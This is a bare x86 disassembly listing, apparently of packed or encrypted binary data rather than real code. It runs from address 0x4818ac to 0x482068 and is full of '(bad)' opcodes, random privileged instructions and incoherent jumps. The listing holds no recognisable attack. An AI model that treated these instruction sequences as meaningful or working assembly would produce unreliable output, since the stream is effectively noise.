  4818ac:	jecxz  0x481830
  4818ae:	xchg   ebx,eax
  4818af:	sbb    al,0x39
  4818b1:	and    bl,ah
  4818b3:	inc    eax
  4818b4:	jecxz  0x4818c8
  4818b6:	push   esp
  4818b7:	jg     0x4818dc
  4818b9:	das    
  4818ba:	or     ah,BYTE PTR [esi-0x43dfe80c]
  4818c0:	sbb    al,0x32
  4818c2:	push   ebp
  4818c3:	jb     0x481857
  4818c5:	mov    ebx,0x4414e360
  4818ca:	rol    DWORD PTR [edi+0x36784553],0x84
  4818d1:	mov    esp,0xd57711f
  4818d6:	iret   
  4818d7:	shl    BYTE PTR [eax+0x37],0xc8
  4818db:	(bad)  
  4818dc:	pushf  
  4818dd:	xchg   edx,eax
  4818de:	xchg   ebx,eax
  4818df:	ins    BYTE PTR es:[edi],dx
  4818e0:	mov    edi,0xe3f8e540
  4818e5:	push   esp
  4818e6:	in     al,0xe7
  4818e8:	mov    ebp,0x642e14a7
  4818ed:	push   cs
  4818ee:	sbb    BYTE PTR [esi+0x2c],dl
  4818f1:	push   es
  4818f2:	dec    esp
  4818f3:	adc    edi,DWORD PTR [ecx+eiz*4-0x29c0f07d]
  4818fa:	cmp    esp,edx
  4818fc:	scas   eax,DWORD PTR es:[edi]
  4818fd:	or     al,0x42
  4818ff:	jnp    0x4818ef
  481901:	pop    es
  481902:	sub    DWORD PTR [ecx-0x3e],ebx
  481905:	out    dx,eax
  481906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  481907:	daa    
  481908:	or     cl,BYTE PTR [esi+0x44]
  48190b:	inc    edi
  48190c:	dec    eax
  48190d:	mov    ebp,0x5bd8487
  481912:	jb     0x4818a6
  481914:	and    edi,DWORD PTR [eax]
  481916:	mov    esp,0x8605e554
  48191b:	test   DWORD PTR [ecx+edx*1-0x40],ecx
  48191f:	ss in  al,0x71
  481922:	adc    edi,DWORD PTR [ebx+0x21]
  481925:	adc    BYTE PTR [esi+0x403efc1f],bh
  48192b:	mov    esi,0x38afa46a
  481930:	test   DWORD PTR [edx-0x5c],0x641be1b1
  481937:	cs push cs
  481939:	push   esp
  48193a:	sbb    ebx,DWORD PTR [eax]
  48193c:	sub    al,0xd6
  48193e:	jge    0x4818c7
  481940:	nop
  481941:	mov    DWORD PTR [edi],0x31790e29
  481947:	cmp    eax,0x8437b1d2
  48194c:	mov    esi,0x22750f59
  481951:	add    BYTE PTR [edi+0x17925083],bh
  481957:	inc    ebp
  481958:	xchg   esp,eax
  481959:	add    al,0xa7
  48195b:	test   al,0xf9
  48195d:	and    esp,0x20
  481960:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481961:	iret   
  481962:	inc    ebx
  481963:	aam    0xcf
  481965:	sbb    BYTE PTR [eax+0x1e],cl
  481968:	in     al,0x54
  48196a:	rol    BYTE PTR [ebx+0x24],1
  48196d:	std    
  48196e:	inc    edx
  48196f:	adc    ah,al
  481971:	adc    DWORD PTR [ecx+0x21],edx
  481974:	(bad)  [ecx+0x48921890]
  48197a:	pop    edx
  48197b:	loopne 0x4819f3
  48197d:	add    ebx,esi
  48197f:	rcr    bh,cl
  481981:	adc    BYTE PTR [ebx-0x21],bl
  481984:	adc    DWORD PTR [ebp+0x14],ebx
  481987:	xor    al,0x6
  481989:	ins    DWORD PTR es:[edi],dx
  48198a:	pop    esi
  48198b:	jbe    0x4819af
  48198d:	and    DWORD PTR [edx-0x5f],0x626d626d
  481994:	dec    ebx
  481995:	mov    ebx,0x58415863
  48199a:	jg     0x4819a5
  48199c:	push   esp
  48199d:	fnstenv [esi+esi*4]
  4819a0:	push   ss
  4819a1:	test   eax,0xbf5401d7
  4819a6:	lahf   
  4819a7:	sub    al,0x33
  4819a9:	mov    edi,0x614d6d64
  4819ae:	outs   dx,BYTE PTR ds:[esi]
  4819af:	jne    0x4819c1
  4819b1:	mov    ds:0xaba5616d,al
  4819b6:	sbb    BYTE PTR [ebx-0x14],ch
  4819b9:	arpl   WORD PTR [ebx-0x12],si
  4819bc:	xchg   esp,eax
  4819bd:	ja     0x4819c9
  4819bf:	or     eax,0x58122bb
  4819c4:	pause  
  4819c6:	ss das 
  4819c8:	dec    ecx
  4819c9:	stc    
  4819ca:	xor    BYTE PTR [ebx],cl
  4819cc:	fs jae 0x4819c8
  4819cf:	pop    ss
  4819d0:	xchg   ebp,eax
  4819d1:	xchg   esp,eax
  4819d2:	mov    ch,0xb6
  4819d4:	pop    ecx
  4819d5:	or     dl,BYTE PTR [edi]
  4819d7:	jbe    0x481a02
  4819d9:	add    eax,0xe04f81d7
  4819de:	pmulhw mm6,QWORD PTR [edi+0x4]
  4819e2:	dec    BYTE PTR [bx]
  4819e5:	fsubr  QWORD PTR [esi]
  4819e7:	push   es
  4819e8:	imul   ebp,DWORD PTR fs:[ecx+0x1f],0x7b
  4819ed:	cmp    BYTE PTR ds:0x14906bee,cl
  4819f3:	shl    BYTE PTR [esi+0x1],0x30
  4819f7:	rcr    BYTE PTR [ebp+0x66029192],cl
  4819fd:	enter  0xfd2d,0x8e
  481a01:	mov    ds:0x80a2e2c,al
  481a06:	push   esp
  481a07:	mov    ch,0xac
  481a09:	add    DWORD PTR [edx+ecx*1-0x2],edx
  481a0d:	rcl    bh,0x3e
  481a10:	sbb    al,0x3b
  481a12:	mov    al,ds:0x4403bba1
  481a17:	cmp    al,al
  481a19:	push   esi
  481a1a:	add    al,0xab
  481a1c:	jl     0x481a7f
  481a1e:	imul   eax,DWORD PTR ds:0xa07c80c,0x4
  481a25:	inc    edi
  481a26:	cwde   
  481a27:	or     BYTE PTR [ecx+0x6047d96b],ch
  481a2d:	not    esi
  481a2f:	or     eax,0x8f085b84
  481a34:	jae    0x481a37
  481a36:	jns    0x4819c8
  481a38:	cwde   
  481a39:	imul   eax,DWORD PTR [esp+edx*4],0xffffffca
  481a3d:	pop    es
  481a3e:	xchg   BYTE PTR [ecx+0x4c],cl
  481a41:	ret    0x2f10
  481a44:	in     al,dx
  481a45:	and    edx,DWORD PTR [edx]
  481a47:	mov    ch,0x80
  481a49:	mov    edi,0x1fc100bf
  481a4e:	bound  ecx,QWORD PTR [edx-0x31]
  481a51:	lds    ebx,FWORD PTR [edi]
  481a53:	adc    al,0x20
  481a55:	lahf   
  481a56:	ds push es
  481a58:	jns    0x481a5c
  481a5a:	sar    al,0x42
  481a5d:	xchg   esp,eax
  481a5e:	push   ds
  481a5f:	test   BYTE PTR [esi+0x1efb9a41],bh
  481a65:	adc    BYTE PTR [ecx+eiz*8-0x3],dl
  481a69:	dec    esi
  481a6a:	mov    DWORD PTR [edi],0xd1836983
  481a70:	xor    DWORD PTR [ebx],edx
  481a72:	cwde   
  481a73:	pop    ds
  481a74:	cmp    edi,DWORD PTR [ebx+edx*2]
  481a77:	sub    al,0x6d
  481a79:	adc    al,0x94
  481a7b:	rol    BYTE PTR [eax],0x0
  481a7e:	pushf  
  481a7f:	add    DWORD PTR [edx+0x23],ecx
  481a82:	imul   edx,DWORD PTR [eax],0x31
  481a85:	inc    esi
  481a86:	ins    DWORD PTR es:[edi],dx
  481a87:	dec    ebx
  481a88:	mov    edx,0xc47874b
  481a8d:	dec    edi
  481a8e:	je     0x481aee
  481a90:	xchg   esp,eax
  481a91:	out    dx,al
  481a92:	push   cs
  481a93:	or     BYTE PTR [esi-0x31],al
  481a96:	lea    edx,[eax]
  481a98:	dec    ecx
  481a99:	ds daa 
  481a9b:	xchg   edi,eax
  481a9c:	add    al,BYTE PTR [edx]
  481a9e:	imul   ebp,DWORD PTR [esi-0x35],0x1492e4e7
  481aa5:	add    eax,DWORD PTR [ebx]
  481aa7:	imul   ebp,DWORD PTR [esi-0x7f],0x7607a2c8
  481aae:	call   0xb50b974
  481ab3:	rcl    DWORD PTR [eax+0x5a5247c],1
  481ab9:	push   es
  481aba:	shl    DWORD PTR [eax+eiz*2],1
  481abd:	sub    DWORD PTR [eax],0xffffffeb
  481ac0:	dec    esp
  481ac1:	(bad)  
  481ac2:	dec    ecx
  481ac3:	add    bl,BYTE PTR [esi-0x6a4bdceb]
  481ac9:	es ror edx,1
  481acc:	pop    eax
  481acd:	loope  0x481ae3
  481acf:	pop    ecx
  481ad0:	inc    edx
  481ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481ad2:	pop    ss
  481ad3:	xchg   BYTE PTR [eax],al
  481ad5:	xor    eax,0xb2b7020c
  481ada:	adc    al,0x44
  481adc:	inc    esp
  481add:	push   es
  481ade:	mov    bh,BYTE PTR ss:[edi+eax*1+0xfeec28e]
  481ae6:	div    DWORD PTR ss:[esi]
  481ae9:	mov    BYTE PTR [ebp-0x3a32fb1c],cl
  481aef:	xchg   edx,eax
  481af0:	enter  0x41d,0xb6
  481af4:	(bad)  
  481af5:	(bad)  
  481af6:	pop    esi
  481af7:	out    dx,al
  481af8:	nop
  481af9:	int3   
  481afa:	int3   
  481afb:	push   es
  481afc:	mov    ebx,0x36030103
  481b01:	pop    ebx
  481b02:	int    0xd3
  481b04:	and    al,0xf1
  481b06:	iret   
  481b07:	mov    ds:0xed805700,eax
  481b0c:	push   0x96c3feab
  481b11:	and    BYTE PTR [ebx-0x16016d33],dh
  481b17:	mov    eax,ds:0xc9df0402
  481b1c:	dec    edx
  481b1d:	mov    dl,0x7b
  481b1f:	sub    BYTE PTR [edi],cl
  481b21:	int3   
  481b22:	push   ss
  481b23:	push   eax
  481b24:	(bad)  [edi+esi*2+0x9]
  481b28:	ja     0x481b30
  481b2a:	pop    ecx
  481b2b:	dec    ebx
  481b2c:	mov    edx,0x1d971e90
  481b31:	pop    esp
  481b32:	adc    BYTE PTR [edi+ebx*1+0xb3905cf],al
  481b39:	sub    dh,BYTE PTR cs:[eax+0xb]
  481b3d:	mov    ah,0x5b
  481b3f:	ins    DWORD PTR es:[edi],dx
  481b40:	adc    ch,BYTE PTR [edi]
  481b42:	(bad)  
  481b43:	push   ecx
  481b44:	repz je 0x481b04
  481b47:	fld    QWORD PTR es:[edi]
  481b4a:	cmp    al,0x3b
  481b4c:	add    BYTE PTR [edi],cl
  481b4e:	aam    0x13
  481b50:	sbb    al,0xa8
  481b52:	adc    al,0xf
  481b54:	bound  ecx,QWORD PTR [edi]
  481b56:	add    al,0x83
  481b58:	rcl    BYTE PTR [esi],1
  481b5a:	and    al,0xcb
  481b5c:	into   
  481b5d:	and    esp,edx
  481b5f:	rol    ch,cl
  481b61:	xor    al,0xc4
  481b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481b64:	ja     0x481b2a
  481b66:	cmp    cl,dh
  481b68:	or     BYTE PTR [ecx+0x9],0xa
  481b6c:	inc    ebx
  481b6d:	jbe    0x481afe
  481b6f:	js     0x481b5c
  481b71:	pop    ebx
  481b72:	popf   
  481b73:	(bad)  
  481b74:	jl     0x481b05
  481b76:	or     eax,0x64111f54
  481b7b:	mov    al,ds:0x61544dd7
  481b80:	jb     0x481b51
  481b82:	lock and ah,ah
  481b85:	addr16 gs je 0x481b61
  481b89:	les    eax,FWORD PTR [edi]
  481b8b:	outs   dx,DWORD PTR ds:[esi]
  481b8c:	arpl   WORD PTR [ebx+0x61],bp
  481b8f:	pop    ebp
  481b90:	pop    eax
  481b91:	and    eax,0xf901d859
  481b96:	mov    ds:0x42bcd017,al
  481b9b:	inc    eax
  481b9c:	(bad)
  481b9f:	mov    dh,0x55
  481ba1:	(bad)
  481ba4:	push   esp
  481ba5:	xor    DWORD PTR [eax+0x55],ebx
  481ba8:	not    DWORD PTR [edx]
  481baa:	not    DWORD PTR [edi-0x2f18abfe]
  481bb0:	lds    eax,FWORD PTR [edx+0x4637211d]
  481bb6:	add    al,0xeb
  481bb8:	mov    cl,0x60
  481bba:	xchg   BYTE PTR [ebx+0x4e78ef16],bl
  481bc0:	gs ja  0x481b90
  481bc3:	or     esp,DWORD PTR [ebx-0x25d0905c]
  481bc9:	sub    eax,0xbc410501
  481bce:	out    dx,al
  481bcf:	sar    BYTE PTR [edx-0x50],0xe9
  481bd3:	sub    ah,cl
  481bd5:	pop    ds
  481bd6:	fldcw  WORD PTR [ebx+0x3cc75b8e]
  481bdc:	(bad)  
  481bdd:	paddusb mm1,QWORD PTR [edi]
  481be0:	mov    ebx,0x10d1821
  481be5:	xchg   ecx,eax
  481be6:	mov    BYTE PTR [edi-0x6ff7abef],dl
  481bec:	add    WORD PTR [ebp+0x4b],dx
  481bf0:	mul    DWORD PTR [edx]
  481bf2:	jo     0x481c23
  481bf4:	or     BYTE PTR [edx],cl
  481bf6:	jnp    0x481b79
  481bf8:	adc    DWORD PTR ds:0x1086dd62,ecx
  481bfe:	fisubr DWORD PTR [ebp+esi*2+0x24]
  481c02:	arpl   WORD PTR [ecx+0x100b5405],ax
  481c08:	push   cs
  481c09:	and    DWORD PTR [edi+ebp*4-0x7b1514f8],eax
  481c10:	int3   
  481c11:	push   esp
  481c12:	dec    ebx
  481c13:	adc    bh,ah
  481c15:	add    DWORD PTR [edx],ebp
  481c17:	xor    BYTE PTR [esi],dh
  481c19:	or     bl,BYTE PTR [esi]
  481c1b:	das    
  481c1c:	mov    ds:0x96e85001,eax
  481c21:	packuswb mm2,QWORD PTR [edi+eax*8]
  481c25:	pop    eax
  481c26:	ror    BYTE PTR [esi],cl
  481c28:	das    
  481c29:	sbb    BYTE PTR [eax+ebx*8],dl
  481c2c:	lea    eax,[ecx]
  481c2e:	or     BYTE PTR [edx+0x38],ch
  481c31:	or     al,0x85
  481c33:	add    edi,DWORD PTR [edi+0x608f0171]
  481c39:	fnstenv [ecx+0x6252b0b]
  481c3f:	xchg   ebp,esp
  481c41:	fisttp QWORD PTR [eax]
  481c43:	outs   dx,DWORD PTR ds:[esi]
  481c44:	lds    ebp,FWORD PTR [ebx-0x23]
  481c47:	(bad)  
  481c48:	fist   WORD PTR [edi]
  481c4a:	fs pusha 
  481c4c:	(bad)
  481c50:	fs out dx,eax
  481c52:	add    eax,0xa40ada5d
  481c57:	scas   eax,DWORD PTR es:[edi]
  481c58:	out    dx,eax
  481c59:	and    bl,BYTE PTR [edx+ebx*8]
  481c5c:	add    ecx,DWORD PTR [ebx+0x614986ef]
  481c62:	js     0x481c6e
  481c64:	or     al,0x82
  481c66:	test   BYTE PTR [ecx],bl
  481c68:	addr16 add eax,0x143cd2fe
  481c6e:	enter  0x5710,0x68
  481c72:	gs gs ins BYTE PTR es:[edi],dx
  481c75:	imul   esp,DWORD PTR [ecx],0x5e4abbc
  481c7b:	or     ah,BYTE PTR [ecx-0x50]
  481c7e:	sub    al,dl
  481c80:	int3   
  481c81:	add    bl,BYTE PTR [edx]
  481c83:	retf   
  481c84:	(bad)  
  481c86:	xchg   bh,bl
  481c88:	and    bl,BYTE PTR [edi+0x4c1a2964]
  481c8e:	lds    ecx,FWORD PTR [edx]
  481c90:	test   eax,0x160f9c0f
  481c95:	pop    es
  481c96:	xchg   ah,dl
  481c98:	dec    ebx
  481c99:	push   ebp
  481c9a:	jo     0x481c1c
  481c9c:	test   DWORD PTR [eax-0xcfb93eb],esi
  481ca2:	jmp    0x481c69
  481ca4:	aam    0x27
  481ca6:	out    dx,al
  481ca7:	adc    cl,cl
  481ca9:	out    0x21,al
  481cab:	sub    eax,0x81c12c05
  481cb0:	test   eax,0xda761cb9
  481cb5:	mov    al,0xb1
  481cb7:	lea    esi,[esi-0x35bffe4c]
  481cbd:	ds iret 
  481cbf:	mov    ah,0x6a
  481cc1:	test   ah,0x1f
  481cc4:	pop    edx
  481cc5:	push   ds
  481cc6:	pop    esp
  481cc7:	add    DWORD PTR [ecx+0xb],edx
  481cca:	clc    
  481ccb:	and    BYTE PTR [edi],cl
  481ccd:	das    
  481cce:	stos   DWORD PTR es:[edi],eax
  481ccf:	lods   al,BYTE PTR ds:[esi]
  481cd0:	and    eax,0x42fe3c5f
  481cd5:	addr16 enter 0x6a21,0x1
  481cda:	das    
  481cdb:	fs std 
  481cdd:	and    DWORD PTR [eax],edx
  481cdf:	repnz inc ecx
  481ce1:	xor    al,0xa
  481ce3:	inc    ebx
  481ce4:	push   0xffffffde
  481ce6:	push   cs
  481ce7:	add    dh,BYTE PTR [edi-0x80]
  481cea:	andps  xmm0,XMMWORD PTR [ecx]
  481ced:	dec    ebx
  481cee:	icebp  
  481cef:	push   edi
  481cf0:	xor    al,0xd3
  481cf2:	shl    BYTE PTR [ecx+0x2070254],cl
  481cf8:	add    eax,DWORD PTR [edx]
  481cfa:	push   es
  481cfb:	add    al,al
  481cfd:	mov    ebx,0x2d2a75a
  481d02:	add    BYTE PTR ds:0x20a0240,al
  481d08:	pop    ds
  481d09:	add    al,BYTE PTR [ecx]
  481d0b:	push   edi
  481d0c:	rol    DWORD PTR [eax+0xb],cl
  481d0f:	mov    al,0xc
  481d11:	push   ds
  481d12:	cmp    edx,DWORD PTR [eax]
  481d14:	clc    
  481d15:	dec    DWORD PTR ds:0x35b008b0
  481d1b:	mov    al,0x9
  481d1d:	mov    al,0x23
  481d1f:	mov    al,0x30
  481d21:	mov    al,0xa
  481d23:	das    
  481d24:	sbb    al,0xb0
  481d26:	dec    DWORD PTR [ebp-0x4fc50078]
  481d2c:	cmp    al,0xb0
  481d2e:	cmp    eax,0x7bb043b0
  481d33:	dec    edi
  481d34:	in     eax,dx
  481d35:	(bad)  
  481d36:	in     al,dx
  481d37:	(bad)  
  481d38:	jmp    0x481d39
  481d3a:	jmp    0xffff:0xfffde9ff
  481d41:	(bad)  
  481d42:	call   0xe7480546
  481d47:	jmp    ebp
  481d49:	jmp    esp
  481d4b:	jmp    ebx
  481d4d:	jmp    edx
  481d4f:	jmp    ecx
  481d51:	jmp    eax
  481d53:	(bad)  
  481d54:	(bad)  
  481d56:	fdivp  st(7),st
  481d58:	(bad)  
  481d5a:	fdiv   st(7),st
  481d5c:	(bad)  
  481d5e:	(bad)  
  481d60:	(bad)  
  481d61:	fild   QWORD PTR [eax-0x3a]
  481d64:	fdivr  st,st(7)
  481d66:	xlat   BYTE PTR ds:[ebx]
  481d67:	call   esi
  481d69:	call   ebp
  481d6b:	call   esp
  481d6d:	call   ebx
  481d6f:	call   edx
  481d71:	call   ecx
  481d73:	call   eax
  481d75:	dec    edi
  481d77:	int    0x7f
  481d79:	xchg   ebp,eax
  481d7a:	or     dl,dh
  481d7c:	into   
  481d7d:	dec    ebp
  481d7f:	dec    esp
  481d81:	dec    ebx
  481d83:	dec    edx
  481d85:	icebp  
  481d86:	add    DWORD PTR [ecx-0x360029a3],0xfa22f016
  481d90:	sahf   
  481d91:	div    DWORD PTR [ebx+ebx*2]
  481d94:	and    eax,DWORD PTR [esi]
  481d96:	dec    esp
  481d97:	and    al,0x9c
  481d99:	pop    eax
  481d9a:	push   ss
  481d9b:	je     0x481d61
  481d9d:	cmp    al,0x4f
  481d9f:	mov    bl,0xf9
  481da1:	push   es
  481da2:	sbb    al,0x25
  481da4:	add    al,0x26
  481da6:	jl     0x481d44
  481da8:	mov    esp,0xf9a7cd3c
  481dad:	adc    al,0x27
  481daf:	push   esp
  481db0:	add    al,0x28
  481db2:	sub    al,0x34
  481db4:	neg    DWORD PTR [esi+0x293cf2a6]
  481dba:	ins    BYTE PTR es:[edi],dx
  481dbb:	inc    esp
  481dbc:	push   ss
  481dbd:	adc    al,0xe
  481dbf:	mov    esi,0xb8cd3de7
  481dc4:	das    
  481dc5:	nop
  481dc6:	cwde   
  481dc7:	push   es
  481dc8:	mov    al,0xc8
  481dca:	ds loopne 0x481df7
  481dcd:	idiv   DWORD PTR ds:0x74f469ef
  481dd3:	push   es
  481dd4:	cwde   
  481dd5:	in     al,0x46
  481dd7:	inc    eax
  481dd8:	sub    ecx,DWORD PTR [esi+0x7db366cf]
  481dde:	push   cs
  481ddf:	call   0x8c8a3f6
  481de4:	test   al,0x21
  481de6:	adc    BYTE PTR ds:0xd9b3de22,bl
  481dec:	ins    BYTE PTR es:[edi],dx
  481ded:	mov    dh,0x20
  481def:	pop    ss
  481df0:	pop    eax
  481df1:	adc    eax,0x6e15310c
  481df6:	add    eax,0x77be69f7
  481dfb:	push   cs
  481dfc:	mov    eax,0xd4168806
  481e01:	les    edx,FWORD PTR [ebx]
  481e03:	push   cs
  481e04:	xchg   ebp,eax
  481e05:	out    0xd3,al
  481e07:	jl     0x481e0f
  481e09:	pop    esp
  481e0a:	adc    al,0x3c
  481e0c:	dec    esp
  481e0d:	sbb    BYTE PTR [eax+0x2c],ah
  481e10:	rcr    DWORD PTR [esi-0x64],cl
  481e13:	adc    eax,0x9a2e485a
  481e18:	lods   al,BYTE PTR ds:[esi]
  481e19:	and    ebx,DWORD PTR [esi-0x620b72cc]
  481e1f:	in     eax,dx
  481e20:	in     al,dx
  481e21:	and    al,0x76
  481e23:	xchg   esp,eax
  481e24:	and    eax,0x9aff304e
  481e29:	cmp    si,WORD PTR [esi+ebx*8+0x340806e6]
  481e31:	paddd  mm4,mm0
  481e34:	push   ds
  481e35:	jge    0x481e86
  481e37:	sti    
  481e38:	into   
  481e39:	push   0x12983e04
  481e3e:	cs add al,0xfc
  481e41:	jle    0x481e8b
  481e43:	adc    DWORD PTR [ebp+0x1ea70186],ecx
  481e49:	mov    ah,0xc9
  481e4b:	nop
  481e4c:	pop    edi
  481e4d:	pop    es
  481e4e:	jl     0x481e61
  481e50:	inc    esi
  481e51:	arpl   WORD PTR ds:0xc80b0c9b,bx
  481e57:	mov    eax,0x9ef623a
  481e5c:	and    DWORD PTR [ebx+0x51],0xd492fa5a
  481e63:	add    eax,DWORD PTR [ebx+0x3]
  481e66:	mov    ah,0x90
  481e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481e69:	jnp    0x481e83
  481e6b:	cmp    eax,0xbaf3f844
  481e70:	mov    eax,ds:0x3c4802b4
  481e75:	cmp    cl,BYTE PTR [eax-0x34]
  481e78:	xchg   esi,eax
  481e79:	es in  al,0x20
  481e7c:	add    al,0x4
  481e7e:	jmp    0x481e28
  481e80:	or     edi,DWORD PTR [ecx-0x46]
  481e83:	aas    
  481e84:	dec    esp
  481e85:	inc    esp
  481e86:	add    eax,0x3753df2
  481e8b:	sub    eax,DWORD PTR [eax-0x70]
  481e8e:	inc    eax
  481e8f:	jo     0x481e9f
  481e91:	mov    ds:0x7996b,al
  481e96:	push   es
  481e97:	cmp    DWORD PTR [edi],edi
  481e99:	popa   
  481e9a:	sbb    ch,BYTE PTR [ebp-0x57f80012]
  481ea0:	popa   
  481ea1:	pop    es
  481ea2:	mov    al,0x5e
  481ea4:	les    eax,FWORD PTR [edi-0x9]
  481ea7:	inc    eax
  481ea8:	mov    edx,0x27090aec
  481ead:	dec    esp
  481eae:	pop    es
  481eaf:	mov    ecx,DWORD PTR [eax]
  481eb1:	add    bl,BYTE PTR [eax-0x4c]
  481eb4:	add    BYTE PTR [esi],al
  481eb6:	mov    ecx,0x76b890b3
  481ebb:	loope  0x481eaf
  481ebd:	sub    cl,al
  481ebf:	or     DWORD PTR [ecx],0x12
  481ec2:	or     DWORD PTR [eax-0x20],esp
  481ec5:	xchg   ecx,eax
  481ec6:	xlat   BYTE PTR ds:[ebx]
  481ec7:	and    DWORD PTR [ecx+0x58dc1de4],esi
  481ecd:	dec    edx
  481ece:	int3   
  481ecf:	fadd   QWORD PTR [ecx-0x6d]
  481ed2:	push   cs
  481ed3:	enter  0xc40a,0xcd
  481ed7:	jg     0x481f15
  481ed9:	xchg   esp,eax
  481eda:	fdiv   st(4),st
  481edc:	inc    eax
  481edd:	into   
  481ede:	inc    edx
  481edf:	add    BYTE PTR [eax+edi*1],ah
  481ee2:	mov    esi,0x43314c42
  481ee7:	mov    WORD PTR [eax+0xe],es
  481eea:	test   BYTE PTR [eax+0x31],dh
  481eed:	pop    ss
  481eee:	cmp    al,BYTE PTR cs:[eax]
  481ef1:	daa    
  481ef2:	adc    eax,0x75c167
  481ef7:	dec    eax
  481ef8:	das    
  481ef9:	pop    esp
  481efa:	jle    0x481f09
  481efc:	jb     0x481f23
  481efe:	test   al,0x56
  481f00:	dec    ecx
  481f01:	ins    DWORD PTR es:[edi],dx
  481f02:	or     ebx,DWORD PTR gs:[ecx+0x1c4f7e20]
  481f09:	sub    al,0x9
  481f0b:	imul   ebp,DWORD PTR [ebp+0x60],0x239b092d
  481f12:	pop    es
  481f13:	adc    dh,BYTE PTR [ebx-0x4297f1fa]
  481f19:	sti    
  481f1a:	xchg   esp,eax
  481f1b:	outs   dx,BYTE PTR ds:[esi]
  481f1c:	or     dh,BYTE PTR [eax]
  481f1e:	xchg   edx,eax
  481f1f:	inc    ebx
  481f20:	ja     0x481eff
  481f22:	ret    0x68d6
  481f25:	or     BYTE PTR [ebx+edx*2],dl
  481f28:	inc    ecx
  481f29:	xchg   edx,eax
  481f2a:	popa   
  481f2b:	inc    esp
  481f2c:	(bad)  
  481f2e:	mov    esp,0x4a44b8ab
  481f33:	jb     0x481f52
  481f35:	push   ebx
  481f36:	dec    ebx
  481f37:	popa   
  481f38:	je     0x481f47
  481f3a:	shl    BYTE PTR [ebx],0x13
  481f3d:	ds xchg esp,eax
  481f3f:	inc    ebx
  481f40:	push   0x53768468
  481f45:	xchg   ebx,eax
  481f46:	mov    dh,0x33
  481f48:	lods   al,BYTE PTR ds:[esi]
  481f49:	add    al,0x67
  481f4b:	jne    0x481f11
  481f4d:	sub    BYTE PTR [ebx],dl
  481f4f:	scas   eax,DWORD PTR es:[edi]
  481f50:	push   es
  481f51:	mov    al,0x1c
  481f53:	dec    esp
  481f54:	in     al,dx
  481f55:	push   ds
  481f56:	or     al,BYTE PTR [ecx]
  481f58:	push   ss
  481f59:	shl    dh,0x8c
  481f5c:	push   ds
  481f5d:	cld    
  481f5e:	into   
  481f5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  481f60:	ret    
  481f61:	mov    eax,ds:0xc3f70b8f
  481f66:	rcl    DWORD PTR [eax-0x2d8ff788],0x18
  481f6d:	iret   
  481f6e:	outs   dx,DWORD PTR ds:[esi]
  481f6f:	mov    edi,0x740169b3
  481f74:	jbe    0x481fea
  481f76:	jge    0x481f7b
  481f78:	adc    al,0xcf
  481f7a:	sbb    DWORD PTR [ebx],ecx
  481f7c:	mov    al,0x67
  481f7e:	bound  esi,QWORD PTR [esi+0x9]
  481f81:	or     al,0x3b
  481f83:	dec    ebp
  481f84:	mov    al,0xa9
  481f86:	inc    ecx
  481f87:	xor    al,0x12
  481f89:	push   edx
  481f8a:	popa   
  481f8b:	pushf  
  481f8c:	adc    BYTE PTR [edi],al
  481f8e:	es pop ecx
  481f90:	push   edx
  481f91:	xor    ah,BYTE PTR [edi-0x69]
  481f94:	xchg   ebx,eax
  481f95:	add    BYTE PTR [ebx],ch
  481f97:	cmp    eax,0x2b97cf60
  481f9c:	dec    esi
  481f9d:	mov    edx,0x5c910b1c
  481fa2:	gs inc ebp
  481fa4:	fwait
  481fa5:	nop
  481fa6:	xchg   edi,eax
  481fa7:	iret   
  481fa8:	bound  esp,QWORD PTR [ebp+0x62]
  481fab:	bound  esp,QWORD PTR gs:[ebp-0x5c]
  481faf:	push   ebp
  481fb0:	pop    edx
  481fb1:	cmp    DWORD PTR [ebx],0x73870bad
  481fb7:	add    DWORD PTR [ecx+0x7e],edi
  481fba:	mov    esp,0x6060f2b7
  481fbf:	sar    ch,cl
  481fc1:	mov    eax,0x22096b49
  481fc6:	xchg   esp,eax
  481fc7:	lahf   
  481fc8:	or     al,0x54
  481fca:	imul   ebp,DWORD PTR [ebp+esi*1-0x64],0xc02dc29
  481fd2:	push   eax
  481fd3:	daa    
  481fd4:	and    eax,0xe220ef
  481fd9:	rcr    BYTE PTR [edi+0x6b636f44],1
  481fdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  481fe0:	mov    BYTE PTR [esi+edi*8],al
  481fe3:	jns    0x481fe2
  481fe5:	sbb    DWORD PTR [esi+0x6020c281],eax
  481feb:	popa   
  481fec:	div    DWORD PTR [eax-0x14]
  481fef:	mov    ds:0xb63e870,eax
  481ff4:	cmp    al,0x7c
  481ff6:	add    cx,si
  481ff9:	fdivr  QWORD PTR [esi-0x2a]
  481ffc:	inc    esp
  481ffd:	shr    DWORD PTR [ebx+eax*1+0x5e1f1403],1
  482004:	(bad)  
  482005:	nop
  482006:	sbb    eax,0x43e3a00
  48200b:	imul   BYTE PTR [eax-0x37]
  48200e:	fld    st(0)
  482010:	call   0xaa56a035
  482015:	add    BYTE PTR [eax+ecx*4+0x1098df37],ch
  48201c:	or     cl,bh
  48201e:	in     al,dx
  48201f:	inc    edx
  482020:	inc    ebx
  482021:	pop    es
  482022:	add    cl,BYTE PTR [esi]
  482024:	aam    0xe1
  482026:	cld    
  482027:	clc    
  482028:	xchg   edx,eax
  482029:	jmp    0x918d0270
  48202e:	add    BYTE PTR [ecx-0x3a],ch
  482031:	adc    DWORD PTR [ecx],eax
  482033:	dec    esi
  482034:	adc    esp,ebp
  482036:	jg     0x481fbf
  482038:	dec    edx
  482039:	jbe    0x48203c
  48203b:	adc    eax,0x2d003901
  482040:	add    BYTE PTR [ebx],ch
  482042:	add    BYTE PTR [esi+edx*1],ch
  482045:	(bad)  
  482046:	sti    
  482047:	push   eax
  482048:	adc    eax,0x31a4646
  48204d:	dec    edx
  48204e:	add    DWORD PTR [ecx+eax*1],eax
  482051:	add    BYTE PTR [edi+0x57f000a],bh
  482057:	add    DWORD PTR [edx],eax
  482059:	add    DWORD PTR [edx],edx
  48205b:	add    DWORD PTR [edi],ebp
  48205d:	adc    BYTE PTR [esi],ch
  48205f:	mov    es,WORD PTR [ebx-0x14947e00]
  482065:	mov    bh,0xd
  482067:	outs   dx,BYTE PTR ds:[esi]
  482068:	add    BYTE PTR [ebp+0x3110376],al
